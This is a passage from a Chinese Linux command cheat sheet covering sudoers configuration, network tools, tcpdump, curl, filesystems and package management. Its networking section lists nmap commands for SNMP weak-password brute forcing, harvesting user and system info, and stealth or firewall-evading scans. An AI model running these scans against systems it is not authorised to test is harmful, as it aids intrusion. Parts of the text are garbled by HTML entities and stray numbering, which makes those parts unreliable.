一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件lsattr 显示特殊的属性12345678为用户配置sudo权限su 切换用户身份。visudo 编辑&#x2F;etc&#x2F;sudoers文件的专属命令。sudo 以另外一用户身份（默认为root用户）执行事先在sudoers文件中允许的命令。123用root编辑 vi &#x2F;etc&#x2F;sudoers；不过现在默认都用visudo命令来编辑文件，在文件的如下位置，为hadoop添加一行即可 root ALL&#x3D;(ALL) ALLhadoop ALL&#x3D;(ALL) ALL 然后，hadoop用户就可以用sudo来执行系统级别的指令 验证：切换到授权的用户下，执行：sudo -l 来查看哪些命令是可以执行或禁止的； sudo -v &#x2F;&#x2F;可更新sudo切换后的时间戳，不至于过期 &#x2F;etc&#x2F;sudoers中每行就算一个规则，带有#号可以当作是说明的内容，不会执行；如果规则很长，一行列不下时，可以用\\号来续行，这样一个规则就可以有多个行；&#x2F;etc&#x2F;sudoers 的规则可分为两类；一类是别名定义，另一类是授权规则；别名定义并不是必须的，但授权规则是必须的； 别名规则定义格式如下： Alias_Type NAME &#x3D; item1, item2, … 或如下这样#Alias_Type NAME &#x3D; item1, item2, item3 : NAME &#x3D; item4, item5 &#x2F;&#x2F;别名之间用:号分割； ##别名类型（Alias_Type）：别名类型包括如下四种 #Host_Alias 定义主机别名； 用于在下文定义授权规则时通过该定义主机别名来限制特定一组主机，否则就需要用ALL来匹配所有可能出现的主机情况#User_Alias 用户别名，别名成员可以是用户，用户组（前面要加%号），成员与成员之间，通过半角,号分隔；;且需要在系统中确实在存在的，即；在&#x2F;etc&#x2F;paswd中必须存在#Runas_Alias 用来定义runas别名，这个别名指定的是“目的用户”，即sudo 允许切换至的用户； 定义的是某个系统用户可以sudo 切换身份到Runas_Alias 下的成员#Cmnd_Alias 定义命令别名；注意：命令别名下的成员必须是文件或目录的绝对路径； 别名长的话，可以通过 \\ 号断行； Cmnd_Alias USERMAG&#x3D;&#x2F;usr&#x2F;sbin&#x2F;adduser,&#x2F;usr&#x2F;sbin&#x2F;userdel,&#x2F;usr&#x2F;bin&#x2F;passwd [A-Za-z]*,&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmodCmnd_Alias DISKMAG&#x3D;&#x2F;sbin&#x2F;fdisk,&#x2F;sbin&#x2F;partedCmnd_Alias NETMAG&#x3D;&#x2F;sbin&#x2F;ifconfig,&#x2F;etc&#x2F;init.d&#x2F;networkCmnd_Alias KILL &#x3D; &#x2F;usr&#x2F;bin&#x2F;killCmnd_Alias PWMAG &#x3D; &#x2F;usr&#x2F;sbin&#x2F;reboot,&#x2F;usr&#x2F;sbin&#x2F;haltCmnd_Alias SHELLS &#x3D; &#x2F;usr&#x2F;bin&#x2F;sh, &#x2F;usr&#x2F;bin&#x2F;csh, &#x2F;usr&#x2F;bin&#x2F;ksh, \\ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;tcsh, &#x2F;usr&#x2F;bin&#x2F;rsh, \\ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;zshCmnd_Alias SU &#x3D; &#x2F;usr&#x2F;bin&#x2F;su,&#x2F;bin,&#x2F;sbin,&#x2F;usr&#x2F;sbin,&#x2F;usr&#x2F;bin ##授权规则语法：授权用户 主机&#x3D;命令动作，在动作之前也可以指定切换到特定用户下，在这里指定切换的用户要用括号括起来，如果不需要密码直接运行命令的，应该加NOPASSWD:参数ZQadmin ALL&#x3D;&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmod ##表示ZQadmin可以在任何可能出现的主机名的系统中，可以切换到root用户下执行&#x2F;bin&#x2F;chown 和&#x2F;bin&#x2F;chmod 命令；这里省略了指定切换到哪个用户下执行&#x2F;bin&#x2F;shown 和&#x2F;bin&#x2F;chmod命令；在省略的情况下默认为是切换到root用户下执行；同时也省略了是不是需要ZQadmin用户输入验证密码，如果省略了，默认为是需要验证密码。 #因此授权规则可以这样写：授权用户 主机&#x3D;[(切换到哪些用户或用户组)] [是否需要密码验证] 命令1,[(切换到哪些用户或用户组)] [是否需要密码验证] [命令2],[(切换到哪些用户或用户组)] [是否需要密码验证] [命令3]…… &#x2F;&#x2F;[ ]中的内容，是可以省略；命令与命令之间用,号分隔；ZQadmin ALL&#x3D;(root) NOPASSWD:&#x2F;bin&#x2F;chown, &#x2F;bin&#x2F;chmod ##&#x2F;&#x2F;执行chown不需输入密码，执行chmod时需要ZQadmin输入自己的密码%admin ALL&#x3D;&#x2F;usr&#x2F;sbin&#x2F;,&#x2F;sbin&#x2F; ##表示admin用户组下的所有成员，在所有可能的出现的主机名下，都能切换到root用户下运行 &#x2F;usr&#x2F;sbin和&#x2F;sbin目录下的所有命令；wangju ALL&#x3D;&#x2F;usr&#x2F;sbin&#x2F;,&#x2F;sbin&#x2F;,!&#x2F;usr&#x2F;sbin&#x2F;fdisk #&#x2F;&#x2F;表示wangju用户在所有可能存在的主机名的主机上运行&#x2F;usr&#x2F;sbin和&#x2F;sbin下所有的程序，但fdisk 程序除外； #按别名来建立规则,b写明首位必须为大写字母，其后可跟下划线和数字User_Alias SYSADER&#x3D;admin,linuxsir,%adminUser_Alias DISKADER&#x3D;lanhaitunRunas_Alias OP&#x3D;root #&#x2F;定义要临时su的目标用户的别名为OP，实际成员为rootCmnd_Alias SYUCMD&#x3D;&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmod,&#x2F;usr&#x2F;sbin&#x2F;adduser,&#x2F;usr&#x2F;bin&#x2F;passwd [A-Za-z]*,!&#x2F;usr&#x2F;bin&#x2F;passwd root #&#x2F;不能通过passwd 来更改root密码；Cmnd_Alias DSKCMD&#x3D;&#x2F;sbin&#x2F;parted,&#x2F;sbin&#x2F;fdisk #注：定义命令别名DSKCMD，下有成员parted和fdisk ； 定义别名规则SYSADMIN ALL&#x3D; SYUCMD,DSKCMD #&#x2F;admin、linuxsir和admin用户组下的成员能以root身份运行chown 、chmod 、adduser、passwd，但不能更改root的密码；也可以以root身份运行 parted和fdiskDISKADER ALL&#x3D;(OP) DSKCMD#SYSADMIN ALL&#x3D; NOPASSWD:SYDCMD,NOPASSWD:DSKCMD&#x2F;&#x2F;不用输入密码 123456789101112131415161718192021222324252627282930313233343536373839404142其他chage -E 2005-12-31 user1 设置用户口令的失效期限pwck 检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的用户grpck 检查 ‘&#x2F;etc&#x2F;passwd’ 的文件格式和语法修正以及存在的群组newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组12347、基础网络操作命令（11个）telnet 用TELNET协议远程登录。ssh 用SSH加密协议远程登录。scp 全拼为secure copy，用于不同主机之间复制文件。wget 用命令行下载文件。ping 测试主机之间网络的连通性。route 显示和设置linux系统的路由表。ifup 启动网卡。ifdown 关闭网卡dhclient eth0 以dhcp模式启用 ‘eth0’ip link show 显示所有网口链路状态mii-tool eth0 显示eth0的链路状态ethtool eth0 显示eth0网卡数据统计iwlist scan 显示无线网络iwconfig eth1 显示eth1的无线网卡的配置whois www.baidu.com 在 Whois 数据库中查找nbtscan ip_addr netbios解析 （windows）nmblookup -A ip_addr netbios查看（windows）smbclient -L ip_addr&#x2F;hostname 显示 Windows 主机的远程共享smbget -Rr smb:&#x2F;&#x2F;ip_addr&#x2F;share 通过 smb 从主机 windows 下载文件 ifconfig 查看、配置、启用或禁用网络接口的命令ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing) route 路由管理route -n show routing tableroute add -net 0&#x2F;0 gw IP_Gateway configura default gatewayroute add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0&#x2F;16’route del 0&#x2F;0 gw IP_gateway remove static routeecho “1” &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward activate ip routing12345netstat 查看网络状态1）查看某个服务的TCP连接数#netstat -an | grep ESTABLISHED | grep ‘:80’ | wc -l netstat -nu &#x2F;&#x2F;查看udp的连接数 3）查看网卡列表: netstat -i 显示组播组的关系:netstat -gss 查看网络状态1）ss -ta &#x2F;&#x2F;检测套接字 2）显示所有活动的TCP连接以及计时器:ss -to nmap 网络扫描命令#弱口令检测nmap –sU –p161 –script&#x3D;snmp-brute ip &#x2F;&#x2F;查找snmp弱口令,U:udp;#弱口令利用nmap -sU -p161 –script&#x3D;snmp-netstat ip &#x2F;&#x2F;获取网络端口状态文章来源站点nmap –sU –p161 –script&#x3D;snmp-sysdescr ip &#x2F;&#x2F;获取系统信息nmap -sU -p161 –script&#x3D;snmp-win32-user ip &#x2F;&#x2F;获取用户信息#批量ping扫描nmap -sP 192.168.10.0&#x2F;24nmap -sL 192.168.10.0&#x2F;24 &#x2F;&#x2F;仅列出指定网络上的每台主机，不发送任何报文到目标主机（隐蔽探测）nmap -PS -p 22,23,2,80 39.156.66.18 &#x2F;&#x2F;探测目标主机开放的端口,默认情况下nmap只扫描TCP端口nmap -sS 39.156.66.0&#x2F;24 &#x2F;&#x2F;S:使用SYN半开放扫描,T:tcpnmap -sO 39.156.66.0&#x2F;24 &#x2F;&#x2F;探测目标主机支持哪些IP协议nmap -vv nmap 192.168.10.1 192.168.10.2 192.168.10.3 &#x2F;&#x2F;扫描多台主机nmap 192.168.10.1,2,3nmap 192.168.10.* –exclude 192.168.10.10 &#x2F;&#x2F;执行全网扫描或用通配符扫描时你可以使用“-exclude”选项来排除某些你不想要扫描的主机nmap -A 192.168.10.11 &#x2F;&#x2F;-A启用操作系统和版本检测，脚本扫描和路由跟踪功能,“-O”和“-osscan-guess”也帮助探测操作系统信息nmap -sA 192.168.10.11 &#x2F;&#x2F;探测该主机是否使用了包过滤器或防火墙nmap -PN 192.168.10.11 &#x2F;&#x2F;扫描主机检测其是否受到数据包过滤软件或防火墙的保护,“-F”选项执行一次快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口,“-r”选项表示不会随机的选择端口扫描nmap –iflist &#x2F;&#x2F;“–iflist”选项检测主机接口和路由信息nmap -p T:8888,80 192.168.10.11 &#x2F;&#x2F;指定具体的端口类型和端口号来让nmap扫描,扫描tcp端口nmap -p 80-160 192.168.10.11 &#x2F;&#x2F;扫描某个范围内的端口nmap -PS 192.168.10.11 &#x2F;&#x2F;包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用TCP ACK (PA)和TCP Syn(PS)方法来扫描远程主机nmap -sS 192.168.10.11 &#x2F;&#x2F;隐蔽扫描nmap -sN 1192.168.10.11 &#x2F;&#x2F;TCP空扫描规避防火墙123456789101112131415161718192021222324lsof 全名为list open files，也就是列举系统中已经被打开的文件。mail 发送、接收邮件。mutt 邮件管理命令。 nslookup 查询互联网DNS服务器的命令dig 查找DNS的解析过程host 查询DNS的命令。traceroute 追踪数据传输路由状况tcpdump 命令行的抓包工具用法： tcpdump [ -adeflnNOpqStvx ] [ -c 数量 ] [ -F 文件名 ] [ -i 网络接口 ] [ -r 文件名] [ -s snaplen ] [ -T 类型 ] [ -w 文件名 ] [表达式 ] tcpdump的选项： -a 将网络地址和广播地址转变成名字；-d 将匹配信息包的代码以人们能够理解的汇编格式给出；-dd 将匹配信息包的代码以c语言程序段的格式给出；-ddd 将匹配信息包的代码以十进制的形式给出；-e 在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议；-f 将外部的Internet地址以数字的形式打印出来；-l 使标准输出变为缓冲行形式；-n 指定将每个监听到数据包中的域名转换成IP地址后显示，不把网络地址转换成名字；-nn： 指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示-t 在输出的每一行不打印时间戳；-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息；-vv 输出详细的报文信息；-c 在收到指定的包的数目后，tcpdump就会停止；-F 从指定的文件中读取表达式,忽略其它的表达式；-i 指定监听的网络接口；-p： 将网卡设置为非混杂模式，不能与host或broadcast一起使用-r 从指定的文件中读取包(这些包一般通过-w选项产生)；-w 直接将包写入文件中，并不分析和打印出来；-s snaplen snaplen表示从一个包中截取的字节数。0表示包不截断，抓完整的数据包。默认的话 tcpdump 只显示部分数据包,默认68字节。-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc （远程过程调用）和snmp（简单网络管理协议；）-X 告诉tcpdump命令，需要把协议头和包内容都原原本本的显示出来（tcpdump会以16进制和ASCII的形式显示），这在进行协议分析时是绝对的利器。 1）抓取包含10.10.10.122的数据包 tcpdump -i eth0 -vnn host 10.10.10.12212）抓取包含10.10.10.0&#x2F;24网段的数据包 tcpdump -i eth0 -vnn net 10.10.10.0&#x2F;2413）抓取包含端口22的数据包 tcpdump -i eth0 -vnn port 2214）抓取udp协议的数据包 tcpdump -i eth0 -vnn udp15）抓取icmp协议的数据包#tcpdump -i eth0 -vnn icmp 6）抓取arp协议的数据包tcpdump -i eth0 -vnn arp 7）抓取ip协议的数据包tcpdump -i eth0 -vnn ip 8）抓取源ip是10.10.10.122数据包。tcpdump -i eth0 -vnn src host 10.10.10.122 9、抓取目的ip是10.10.10.122数据包tcpdump -i eth0 -vnn dst host 10.10.10.122 10）抓取源端口是22的数据包tcpdump -i eth0 -vnn src port 22 11）抓取源ip是10.10.10.253且目的ip是22的数据包tcpdump -i eth0 -vnn src host 10.10.10.253 and dst port 22 12）抓取源ip是10.10.10.122或者包含端口是22的数据包tcpdump -i eth0 -vnn src host 10.10.10.122 or port 22 13）抓取源ip是10.10.10.122且端口不是22的数据包tcpdump -i eth0 -vnn src host 10.10.10.122 and not port 22 14）抓取源ip是10.10.10.2且目的端口是22，或源ip是10.10.10.65且目的端口是80的数据包。tcpdump -i eth0 -vnn ( src host 10.10.10.2 and dst port 22 ) or ( src host 10.10.10.65 and dst port 80 ) 15）抓取源ip是10.10.10.59且目的端口是22，或源ip是10.10.10.68且目的端口是80的数据包。tcpdump -i eth0 -vnn ‘src host 10.10.10.59 and dst port 22’ or ’ src host 10.10.10.68 and dst port 80 ’ 16）把抓取的数据包记录存到&#x2F;tmp&#x2F;fill文件中，当抓取100个数据包后就退出程序。tcpdump –i eth0 -vnn -w &#x2F;tmp&#x2F;fil1 -c 100 17）从&#x2F;tmp&#x2F;fill记录中读取tcp协议的数据包tcpdump –i eth0 -vnn -r &#x2F;tmp&#x2F;fil1 tcp 18）从&#x2F;tmp&#x2F;fill记录中读取包含10.10.10.58的数据包tcpdump –i eth0 -vnn -r &#x2F;tmp&#x2F;fil1 host 10.10.10.58 mtr(（My traceroute是ping+traceroute)Linux版本的mtr命令默认发送ICMP数据包进行链路探测。可以通过“-u”参数来指定使用UDP数据包用于探测。相对于traceroute命令只会做一次链路跟踪测试，mtr命令会对链路上的相关节点做持续探测并给出相应的统计信息。所以，mtr命令能避免节点波动对测试结果的影响，所以其测试结果更正确，建议优先使用。此工具也有对应的Windows版本，名称为WinMTR。 用法： mtr [-hvrctglspni46] [-help] [-version] [-report] [-report-cycles&#x3D;COUNT] [-curses] [-gtk] [-raw] [-split] [-no-dns] [-address interface] [-psize&#x3D;bytes&#x2F;-s bytes] [-interval&#x3D;SECONDS] HOSTNAME [PACKETSIZE] 常见可选参数说明： -r 或 -report：以报告模式显示输出。 -p 或 -split：将每次追踪的结果分别列出来。 -s 或 -psize：指定ping数据包的大小。 -n 或 -no-dns：不对IP地址做域名反解析。 -a 或 -address：设置发送数据包的IP地址。用于主机有多个IP时。 -4：只使用IPv4协议。 -6：只使用IPv6协议。 另外，也可以在mtr命令运行过程中，输入相应字母来快速切换模式。 ？或 h：显示帮助菜单。 d：切换显示模式。 n：切换启用或禁用DNS域名解析。 u：切换使用ICMP或UDP数据包进行探测。 默认配置下，返回结果中各数据列的说明： 第一列（Host）：节点IP地址和域名。如前面所示，按n键可以切换显示。 第二列（Loss%）：节点丢包率。 第三列（Snt）：每秒发送数据包数。默认值是10，可以通过参数“-c”指定。 第四列（Last）：最近一次的探测延迟值。 第五、六、七列（Avg、Best、Wrst）：分别是探测延迟的平均值、最小值和最大值。 第八列（StDev）：标准偏差。越大说明相应节点越不稳定。 ncat(nc)ncat&#x2F;nc既是一个端口扫描工具，也是一款安全工具，还是一款监测工具，甚至可以做为一个简单的TCP代理。yum install nmap-ncat -y ncat -l 80 &#x2F;&#x2F;监听某个端口的入站连接 ncat -v 49.235.179.157 22 &#x2F;&#x2F;测试主机端口的连通性,另一端监听，还可实现nc进行主机间通信 ftop(查看流量)yum install iftop -yiftop -i eth0 &#x2F;&#x2F; 参数：-i: 指定监听接口-B: 以字节而非比特显示，默认是小b，即比特 其中，结果各字段表示如下：TX：发送流量RX：接收流量TOTAL：总流量Cumm：运行iftop到目前时间的总流量peak：流量峰值rates：分别表示过去 2s 10s 40s 的平均流量 trickle(限制带宽):应用用于限制网络带宽yum install trickle -y &#x2F;&#x2F;安装 1）限制wget的上传和下载速度限制上传为10KB&#x2F;S,下载为20KB&#x2F;s trickle -u 10 -d 20 wget http://mirrors.163.com/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1503-01.iso 2)单独限制某个进程的下载和上传速度trickle -s -d 50 -u 25 ftp 3)限制终端下的所有命令带宽为，下载500KB&#x2F;S，上传250KB&#x2F;s;trickle -s -d 500 -u 250 bash &#x2F;&#x2F;单独命令使用时，必须加-s参数 网络带宽测试：iperfiperf 是一个网络性能测试工具，它可以测试 TCP 和 UDP 带宽质量，可以测量最大 TCP 带宽，具有多种参数和 UDP 特性，可以报告带宽，延迟抖动和数据包丢失。利用 iperf 这一特性，可以用来测试一些网络设备如路由器，防火墙，交换机等的性能。 yum -y install iperf gcc gcc-c++ gcc-g77或源码安装： wget -C https://downloads.es.net/pub/iperf/iperf-3-current.tar.gztar xvf iperf-3-current.tar.gzcd iperf.&#x2F;configuremakemake install123456测试示例：1 ）测试最大的TCP 带宽（参数-r是做双向测试，-M指定传输帧的大小） server端：iperf -s -p 5800 -M 1460 -i 1client端： iperf -c server_ip -p 5800 -M 1460 -m -i 1 -r 测试丢包率server端：iperf -s -i 1 -uclient端： iperf -c server_ip -i 1 -u -t 10 -b 500m -d 带宽测试工具：speedtestspeedtest 是一个用 Python 写成的工具，speedtest 命令将直接提供上传&#x2F;下载速率； $ sudo apt install speedtest-cli或者$ sudo pip3 install speedtest-cli dstat(监控cpu内存)yum install dstat -y &#x2F;&#x2F;安装 参数：-c: 显示cpu综合占有率-m: 显示内存使用情况-n: 显示网络状况-l：显示系统负载情况-r：显示I&#x2F;O请求(读&#x2F;写)情况 eg1：dstat -ncmlr curl(发送请求)1）url -O 文件名 url &#x2F;&#x2F;保存到文件 2）用-i,显示网页头部信息 当然也会把网页信息显示出来，参数 -v可以显示通信的过程 3）更详细的通信信息可以用 参数 –trance 文件名 url,具体信息保存到单独的文件中curl –trace info.txt www.baidu.com 4）使用参数 -X指定htpp的动词，例如GET POST，PUT，DELETE等,curl默认的是get请求，如果发送POSt请求curl -X POST www.baidu.com 5）发送表单的时，只需要把数据拼接到url后面就行curl www.baidu.com?data=xxx&amp;data1=xxx 6）POST发送表单 curl -X POST –data “data&#x3D;xxx” example.com&#x2F;form.cgiPOST发送请求的数据体可以用-d $ curl -d’login&#x3D;emma＆password&#x3D;123’-X POST https://google.com/login或者$ curl -d ‘login&#x3D;emma’ -d ‘password&#x3D;123’ -X POST https://google.com/login 使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application&#x2F;x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。-d参数可以读取本地文本文件的数据，向服务器发送。 curl -d ‘@data.txt’ https://google.com/login &#x2F;&#x2F;读取data.txt文件的内容，作为数据体向服务器发送。7）文件上传curl –form upload&#x3D;@localfilename –form press&#x3D;OK [URL]curl –referer www.baidu.com www.baidu.com &#x2F;&#x2F;–referer参数表示的是你从哪个页面来的 8）其他参数：–user-agent 可以用-A或者-H来替代，这个字段表示的是客户端设备的信息，服务器可能会根据这个User Agent字段来判断是手机还是电脑curl –user-agent “ 内容” url–cookie参数，使用–cookie可以携带cookie信息curl –cookie “name&#x3D;xxx” URL-c cookie-file可以保存服务器返回的cookie到文件，-b cookie-file可以使用这个文件作为cookie信息，进行后续的请求。–header增加头部信息curl –header “Content-Type:application&#x2F;json” http://example.com 8、磁盘与文件系统的命令（16个）mount 挂载文件系统。mount -t iso9660 -o ro &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom&#x2F; ##将设备&#x2F;dev&#x2F;cdrom挂载到 挂载点 ： &#x2F;mnt&#x2F;cdrom中mount -t iso9660 -o loop &#x2F;home&#x2F;hadoop&#x2F;Centos-6.7.DVD.iso &#x2F;mnt&#x2F;centos ##挂载光盘镜像文件(.iso文件)mount &#x2F;dev&#x2F;fd0 &#x2F;mnt&#x2F;floppy 挂载一个软盘mount -o loop file.iso &#x2F;mnt&#x2F;cdrom 挂载一个文件或ISO镜像文件mount -t vfat &#x2F;dev&#x2F;hda5 &#x2F;mnt&#x2F;hda5 挂载一个Windows FAT32文件系统mount &#x2F;dev&#x2F;sda1 &#x2F;mnt&#x2F;usbdisk 挂载一个usb 捷盘或闪存设备mount -t smbfs -o username&#x3D;user,password&#x3D;pass &#x2F;&#x2F;WinClient&#x2F;share &#x2F;mnt&#x2F;share 挂载一个windows网络共享1234567注：挂载的资源在重启后即失效，需要重新挂载。要想自动挂载，可以将挂载信息设置到&#x2F;etc&#x2F;fstab配置文件中，vi &#x2F;etc&#x2F;fstab，增加：&#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom iso9660 defaults 0 0 umount 卸载文件系统。umount &#x2F;mnt&#x2F;cdrom（挂载点）fuser -km &#x2F;mnt&#x2F;hda2 当设备繁忙时强制卸载umount -n &#x2F;mnt&#x2F;hda2 运行卸载操作而不写入 &#x2F;etc&#x2F;mtab 文件- 当文件为只读或当磁盘写满时非常有用 fsck 检查并修复Linux文件系统。dd 转换、复制文件。dumpe2fs 导出ext2&#x2F;ext3&#x2F;ext4等文件系统信息。dump ext2&#x2F;3&#x2F;4等文件系统备份工具。fdisk 磁盘分区命令，适用于2TB以下磁盘分区。parted 磁盘分区命令，没有磁盘大小限制，常用于2TB以下磁盘分区。mkfs 格式化创建Linux文件系统。partprobe 更新内核的硬盘分区表信息。e2fsck 检查ext2&#x2F;ext3&#x2F;ext4等类型文件系统。mkswap 创建Linux的交换分区。swapon 启用交换分区。swapoff 关闭交换分区。sync 将内存缓冲区内的数据写入磁盘。resize2fs 调整ext2&#x2F;ext3&#x2F;ext4等文件系统大小。 du 计算磁盘空间使用情况。du -sh &#x2F;mnt&#x2F;cdrom&#x2F;packages统计文件或文件夹的大小du -cks * | sort -rn | head -n 10 ##找出占用空间最多的文件或目录：du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小1234ls -lSr |more 以尺寸大小排列文件和目录rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)dpkg-query -W -f&#x3D;‘I n s t a l l e d − S i z e ; 10 t {Installed-Size;10}tInstalled−Size;10t{Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) df 报告文件系统磁盘空间使用情况。df -h 查看磁盘的空间1磁盘I&#x2F;O负载#iostat -x 1 2 &#x2F;&#x2F;检查I&#x2F;O使用率(%util)是否超过100% 光盘操作光盘 cdrecord -v gracetime&#x3D;2 dev&#x3D;&#x2F;dev&#x2F;cdrom -eject blank&#x3D;fast -force 清空一个可复写的光盘内容mkisofs &#x2F;dev&#x2F;cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件mkisofs &#x2F;dev&#x2F;cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o .&#x2F;cd.iso data_cd 创建一个目录的iso镜像文件cdrecord -v dev&#x3D;&#x2F;dev&#x2F;cdrom cd.iso 刻录一个ISO镜像文件gzip -dc cd_iso.gz | cdrecord dev&#x3D;&#x2F;dev&#x2F;cdrom - 刻录一个压缩了的ISO镜像文件mount -o loop cd.iso &#x2F;mnt&#x2F;iso 挂载一个ISO镜像文件cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3）cdrecord –scanbus 扫描总线以识别scsi通道dd if&#x3D;&#x2F;dev&#x2F;hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD 文件系统其他badblocks -v &#x2F;dev&#x2F;hda1 检查磁盘hda1上的坏磁块fsck &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上linux文件系统的完整性fsck.ext2 &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上ext2文件系统的完整性e2fsck &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上ext2文件系统的完整性e2fsck -j &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上ext3文件系统的完整性fsck.ext3 &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上ext3文件系统的完整性fsck.vfat &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上fat文件系统的完整性fsck.msdos &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上dos文件系统的完整性dosfsck &#x2F;dev&#x2F;hda1 修复&#x2F;检查hda1磁盘上dos文件系统的完整性 初始化一个文件系统 mkfs &#x2F;dev&#x2F;hda1 在hda1分区创建一个文件系统mke2fs &#x2F;dev&#x2F;hda1 在hda1分区创建一个linux ext2的文件系统mke2fs -j &#x2F;dev&#x2F;hda1 在hda1分区创建一个linux ext3(日志型)的文件系统mkfs -t vfat 32 -F &#x2F;dev&#x2F;hda1 创建一个 FAT32 文件系统fdformat -n &#x2F;dev&#x2F;fd0 格式化一个软盘mkswap &#x2F;dev&#x2F;hda3 创建一个swap文件系统 SWAP文件系统 mkswap &#x2F;dev&#x2F;hda3 创建一个swap文件系统swapon &#x2F;dev&#x2F;hda3 启用一个新的swap文件系统swapon &#x2F;dev&#x2F;hda2 &#x2F;dev&#x2F;hdb3 启用两个swap分区 9、系统其它（25个）echo 打印变量，直接输出指定的字符串printf 将结果格式化输出到标准输出中。rpm 管理rpm包命令。yum 自动化简单化地管理rpm包的命令。watch 周期的执行给定的命令，并将命令的输出以全屏方式显示。alias 设置系统别名。unalias 取消系统别名。date 查看、设置系统时间。clear 清除屏幕，简称清屏。history 查看命令执行的历史纪录。eject 弹出光驱。time 计算命令执行时间。nc 功能强大网络工具。xargs 将标准输入转换成命令行的参数。exec 调用并执行指令的命令。export 设置或者显示环境变量。unset 删除变量、函数。type 用于判断另外一个命令是否为内置的命令。bc 命令行科学计算器系统管理、性能监视命令（9个）chkconfig 管理Linux系统开机启动项。vmstat 虚拟内存统计。mpstat 显示各个可用CPU的状态统计。iostat 统计系统的IO。sar 全面地获取系统CPU、运行队列、磁盘读写、分页、内存、 CPU中断和网络性能数据。ipcs 用于报告Linux中进程间通信设施的状态，显示信息包括消息列表、共享内存和信号量信息。ipcrm 用来删除一个或更多的消息队列、信号量集或者共享内存标识。strace 用于诊断、调试Linux用户空间跟踪器。我们用它来监控用户空间进程和内核交互，比如系统调用、信号传递、进程状态变更。ltrace 命令会跟踪进程库函数调用，它会显现哪个库函数被调用。shutdown 关机。shutdown -h now 关闭系统init 0 关闭系统telinit 0 关闭系统shutdown -h hours:minutes &amp; 按预定时间关闭系统shutdown -c 取消按预定时间关闭系统shutdown -r now 重启reboot 重启(2)logout 注销halt 关机。poweroff 关闭电源。logout 退出当前登录的Shell。exit 退出当前登录的Shell。Ctrl+d 退出当前登录的Shell的快捷键。进程管理相关命令（15个）bg 将一个后台暂停的命令，变成继续执行。fg 将后台的命令调至前台继续运行。jobs 查看当前有多少后台运行的命令。kill 终止进程。killall 通过进程名来终止进程。pkill 通过进程名来终止进程。crontab 定时任务命令。ps 显示进程快照。pstree 树形显示进程。nice&#x2F;renice 调整程序运行的优先级。nohup 忽略挂起信号运行指定。pgrep 查找匹配条件进程。runlevel 查看系统当前运行级别。init 切换运行级别。service 启动、停止、重新启动、关闭系统服务，还可以显示所有系统服务的当前状态。 软件安装命令1）RPM 包 - （Fedora, Redhat及类似系统）rpm -ivh package.rpm 安装一个rpm包rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告rpm -U package.rpm 更新一个rpm包但不改变其配置文件rpm -F package.rpm 更新一个确定已经安装的rpm包rpm -e package_name.rpm 删除一个rpm包rpm -qa 显示系统中所有已经安装的rpm包rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包rpm -qi package_name 获取一个已安装包的特殊信息rpm -qg “System Environment&#x2F;Daemons” 显示一个组件的rpm包rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表rpm -q package_name –whatprovides 显示一个rpm包所占的体积rpm -q package_name –scripts 显示在安装&#x2F;删除期间所执行的脚本lrpm -q package_name –changelog 显示一个rpm包的修改历史rpm -qf &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf 确认所给的文件由哪个rpm包所提供rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表rpm –import &#x2F;media&#x2F;cdrom&#x2F;RPM-GPG-KEY 导入公钥数字证书rpm –checksig package.rpm 确认一个rpm包的完整性rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间rpm 